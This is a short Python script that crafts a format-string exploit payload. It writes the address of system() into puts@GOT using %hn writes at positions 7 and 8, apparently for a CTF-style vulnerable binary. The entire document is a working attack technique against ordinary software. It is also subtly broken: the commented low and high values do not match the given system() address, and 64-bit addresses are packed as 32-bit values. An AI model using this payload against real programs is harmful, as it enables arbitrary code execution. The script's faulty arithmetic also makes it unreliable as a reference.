from struct import pack

# Addresses
puts_got = 0x079bf0  # Address of puts@GOT
system = 0x7F098F389120    # Address of system()

# Split the system address into low and high parts
low = system & 0xffff       # 0x2450
high = (system >> 16) & 0xffff  # 0xf7e1

# Ensure `high > low` for correct padding calculation
if low > high:
    low, high = high, low
    puts_got, puts_got2 = puts_got + 2, puts_got
else:
    puts_got2 = puts_got + 2

# Start crafting the payload
payload = b""
payload += pack("<I", puts_got)       # Address to write low bytes
payload += pack("<I", puts_got2)      # Address to write high bytes

# Add the padding for low bytes
padding_low = low - len(payload)
payload += f"%{padding_low}x".encode()  # Print enough characters for `low`
payload += b"%7$hn"                     # Write low bytes to `puts@GOT`

# Add the padding for high bytes
padding_high = high - low
payload += f"%{padding_high}x".encode()  # Print enough characters for `high`
payload += b"%8$hn"                      # Write high bytes to `puts@GOT + 2`

print(payload)

